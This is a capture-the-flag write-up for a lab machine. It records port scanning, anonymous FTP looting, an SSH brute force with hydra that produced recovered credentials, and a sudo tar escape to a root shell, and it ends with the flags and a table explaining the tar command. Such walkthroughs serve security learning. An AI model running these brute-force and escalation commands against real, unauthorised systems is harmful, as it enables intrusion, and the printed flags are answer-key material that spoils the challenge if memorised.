## Target: 10.81.169.146
### Recon
Nmap: `rustscan -a 10.81.169.146 -- -A`
### Enumeration
**Open Ports:**
21/tcp open  ftp     syn-ack vsftpd 3.0.5
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|Can't get directory listing: PASV failed: 550 Permission denied.
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))

**Web Findings:**
On port 80 we find a web page with some names mentioned:
_Spike, Jet, Ed (Edward), Ein, Faye_

**Dirsearch**
[19:30:49] 200 -  457B  - /images/
[19:30:49] 301 -  315B  - /images  ->  http://10.81.169.146/images/
[19:30:51] 301 -  319B  - /javascript  ->  http://10.81.169.146/javascript/
Nothing much of interest here.
### Vulnerabilities
FTP allows anonymous login as identified in our port scan, so we log in and grab `lock.txt` and `task.txt`. `lock.txt` is likely a wordlist so we save the output into a `wordlist.txt` file with nano. `task.txt` contains a cryptic message:
_1.) Protect Vicious.
2.) Plan for Red Eye pickup on the moon.
-lin_
Perhaps _lin_ and/or _Vicious_ are usernames.
I made a list of potential usernames (_lin, Spike, etc._) in hopes that one of them is valid. 
### Exploitation
Let's use hydra to try and brute-force ssh
`hydra -L userlist.txt -P wordlist.txt ssh://10.81.169.146`
![[Screenshot 2026-01-31 at 2.48.37 PM.png]]
Obtain _lin:RedDr4gonSynd1cat3_
We can now log in to ssh with those credentials.
### Post Exploitation
`user.txt` is in lin's home directory. 
### Privilege Escalation
A `sudo -l` command tells us that:
```
User lin may run the following commands on ip-10-81-169-146:
    (root) /bin/tar
```
A quick look at GTFO Bin's tar listing gives us a command that will elevate our privileges:
`sudo tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh`
![[Screenshot 2026-01-31 at 2.53.18 PM.png]]
### Flags
- User: _THM{CR1M3_SyNd1C4T3}_
- Root: _THM{80UN7Y_h4cK3r}_
### Notes
In this case, the system password was the same as the SSH pass. I have read that this is standard, although I've found many CTFs make them different.

Here is an explanation of the command we used to elevate privileges:

| Part                               | Meaning                                                                         | Purpose in this exploit                                             |
| ---------------------------------- | ------------------------------------------------------------------------------- | ------------------------------------------------------------------- |
| `sudo`                             | Runs the whole command as root (assuming your user is allowed to sudo tar)      | Gets root privileges for the tar process                            |
| `tar cf`                           | Create (**c**) a new archive and write it to file (**f**)                       | Normal tar syntax, but we abuse it                                  |
| `/dev/null` (first one)            | "Archive name" — we send the output to the black hole (nothing is really saved) | We don't care about creating an actual archive                      |
| `/dev/null` (second one)           | "File to archive" — tar tries to add /dev/null to the archive                   | Dummy file; the real action happens elsewhere                       |
| `--checkpoint=1`                   | Create a checkpoint after every **1** block/record processed                    | Forces tar to trigger the action very early (basically immediately) |
| `--checkpoint-action=exec=/bin/sh` | When a checkpoint is reached → **execute** `/bin/sh` as a **subprocess**        | This is the payload: spawns a shell                                 |
